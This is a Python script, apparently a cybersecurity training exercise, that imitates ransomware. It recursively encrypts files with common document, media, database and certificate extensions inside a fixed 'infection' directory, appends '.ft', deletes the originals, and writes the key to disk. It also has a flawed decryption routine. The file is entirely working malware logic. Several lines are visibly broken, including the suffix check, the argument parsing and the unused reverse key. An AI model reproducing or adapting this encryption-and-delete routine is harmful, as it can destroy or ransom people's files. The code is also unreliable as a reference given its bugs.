import os
from os import listdir, remove, system
from os.path import expanduser, isdir, join, splitext
import sys
import argparse
from cryptography.fernet import Fernet

extensions = [".docx",".ppam",".sti",".vcd",".3gp",".sch",".myd",".wb2",
			  ".docb",".potx",".sldx",".jpeg",".mp4",".dch",".frm",".slk",
			  ".docm",".potm",".sldm",".jpg",".mov",".dip",".odb",".dif",
			  ".dot",".pst",".sldm",".bmp",".avi",".pl",".dbf",".stc",
			  ".dotm",".ost",".vdi",".png",".asf",".vb",".db",".sxc",
			  ".dotx",".msg",".vmdk",".gif",".mpeg",".vbs",".mdb",".ots",
			  ".xls",".eml",".vmx",".raw",".vob",".ps1",".accdb",".ods",
			  ".xlsm",".vsd",".aes",".tif",".wmv",".cmd",".sqlitedb",".max",
			  ".xlsb",".vsdx",".ARC",".tiff",".fla",".js",".sqlite3",".3ds",
			  ".xlw",".txt",".PAQ",".nef",".swf",".asm",".asc",".uot",
			  ".xlt",".csv",".bz2",".psd",".wav",".h",".lay6",".stw",
			  ".xlm",".rtf",".tbk",".ai",".mp3",".pas",".lay",".sxw",
			  ".xlc",".123",".bak",".svg",".sh",".cpp",".mml",".ott",
			  ".xltx",".wks",".tar",".djvu",".class",".c",".sxm",".odt",
			  ".xltm",".wk1",".tgz",".m4u",".jar",".cs",".otg",".pem",
			  ".ppt",".pdf",".gz",".m3u",".java",".suo",".odg",".p12",
			  ".pptx",".dwg",".7z",".mid",".rb",".sln",".uop",".csr",
			  ".pptm",".onetoc2",".rar",".wma",".asp",".ldf",".std",".crt",
			  ".pot",".snt",".zip",".flv",".php",".mdf",".sxd",".key",
			  ".pps",".hwp",".backup",".3g2",".jsp",".ibd",".otp",".pfx",
			  ".ppsm",".602",".iso",".mkv",".brd",".myi",".odp",".der"
			  ]








def parcourir_fichiers(path: str, fernet: Fernet):
	for root, dirs, files in os.walk(path):
		dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(root, d))]

		for file in files:
			fichier_complet = os.path.join(root, file)

			if (not os.path.islink(fichier_complet)):
				for ext in extensions:
					if ext == os.path.splitext(file)[1]:
						new_fichier = fichier_complet + '.ft'

						with open(fichier_complet, 'rb') as file_in:
							raw_data = file_in.read()
						with open(new_fichier, 'wb') as file_out:
							file_out.write(fernet.encrypt(raw_data))
						if not silent:
							print('File encrypted: ' + new_fichier)
						remove(fichier_complet)

#chemin = "./toto"  # Chemin du répertoire à parcourir
#parcourir_fichiers(chemin, encrypt())

def decrypt_files(path: str, fernet: Fernet):
	for root, dirs, files in os.walk(path):
		dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(root, d))]

		for file in files:
			fichier_complet = os.path.join(root, file)

			if (not os.path.islink(fichier_complet)):
				if fichier_complet[:3] == '.ft':
					new_fichier = fichier_complet[:-3]
					with open(fichier_complet, 'rb') as file_in:
						raw_data = file_in.read()
					with open(new_fichier, 'wb') as file_out:
						file_out.write(fernet.decrypt(raw_data))
					if not silent:
						print('File decrypt: ' + new_fichier)
					remove(fichier_complet)








def main() -> int:

	parser = argparse.ArgumentParser(description='test')

	parser.add_argument('-v', '--version', help='show version', action='version', version='sockholm V1.0')
	parser.add_argument('-r', '--reverse', type=str, help='reverse encryption')
	parser.add_argument('-s', '--silent', type=str, help='silent')
	args = vars(parser.parse_args())

	global silent
	silent = args.s("silent", default=False)



	key = Fernet.generate_key()
	if len(key) < 16:
		print('error size of key : must be 64 hex')
		exit(1)
	with open('../key.hex', 'wb') as f:
		f.write(key)

	home_path = '/home/stockholm'
	if not (home_path and isdir(home_path)):
		print('Fatal error: user has no directory to infect', file=sys.stderr)
		return 1
	target_path = join(home_path, 'infection')
	if not isdir(target_path):
		print('Fatal error: target directory does not exist in user home directory', file=sys.stderr)
		return 1

	fernet = Fernet(key)

	parcourir_fichiers(target_path, fernet)

	if args.get("reverse"):
		try:
			key = Fernet(args.reverse)  # Clé de chiffrement fournie pour déchiffrer les fichiers
		except Exception:
			print('Invalid key provided')  # Affiche une erreur en cas de clé de chiffrement invalide

			return 1
		decrypt_files(target_path, fernet)  # Appel de la fonction de déchiffrement récursif
		return 0


	return 0

if __name__ == "__main__":
	sys.exit(main())